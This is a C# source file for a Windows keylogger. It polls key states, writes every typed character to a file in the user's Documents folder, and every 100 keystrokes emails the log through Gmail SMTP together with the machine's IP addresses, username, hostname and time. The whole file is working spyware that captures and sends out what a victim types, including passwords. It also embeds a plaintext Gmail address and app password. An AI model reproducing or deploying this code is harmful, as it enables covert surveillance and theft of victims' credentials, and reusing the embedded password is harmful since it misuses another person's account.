using System;
using System.IO;
using System.Threading;
using System.Runtime.InteropServices;
using System.Net;
using System.Net.Mail;

namespace Keylogger
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        static long numberOfKeystrokes = 0;
        static string path;
        static string folderName;

        static void Main(string[] args)
        {
            folderName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            if (!Directory.Exists(folderName))
            {
                Directory.CreateDirectory(folderName);
            }
            path = Path.Combine(folderName, "keystrokes.txt");
            if (!File.Exists(path))
            {
                File.Create(path).Close();
            }

            while (true)
            {
                Thread.Sleep(5);
                for (int i = 32; i < 127; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState < 0)
                    {
                        Console.WriteLine("Keystroke detected: " + (char)i);
                        Console.Write((char)i + ",");
                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.Write((char)i);
                        }
                        numberOfKeystrokes++;
                        // Send every 100 characters typed
                        if (numberOfKeystrokes % 100 == 0)
                        {
                            SendNewMessage();
                        }
                    }
                }
            }
        }

        static void SendNewMessage()
        {
            try
            {
                string logContents = File.ReadAllText(path);
                string emailBody = "";

                DateTime now = DateTime.Now;
                string subject = "Message from keylogger";
                var host = Dns.GetHostEntry(Dns.GetHostName());
                foreach (var address in host.AddressList)
                {
                    emailBody += "Address: " + address + "\n";
                }
                emailBody += "User: " + Environment.UserDomainName + "\\" + Environment.UserName + "\n";
                emailBody += "Host: " + host.HostName + "\n"; // Ensure correct display of hostname
                emailBody += "Time: " + now.ToString() + "\n";
                emailBody += "Log:\n" + logContents;

                using (SmtpClient client = new SmtpClient("smtp.gmail.com", 587))
                using (MailMessage mailMessage = new MailMessage())
                {
                    mailMessage.From = new MailAddress("nadasondospau@gmail.com");
                    mailMessage.To.Add("nadasondospau@gmail.com");
                    mailMessage.Subject = subject;
                    mailMessage.Body = emailBody;

                    client.UseDefaultCredentials = false;
                    client.EnableSsl = true;
                    client.Credentials = new NetworkCredential("nadasondospau@gmail.com", "zlkt teba elhd xjdi");
                    client.DeliveryMethod = SmtpDeliveryMethod.Network;

                    client.Send(mailMessage);
                    Console.WriteLine("Email sent successfully.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error sending email: " + ex.Message);
            }
        }
    }
}
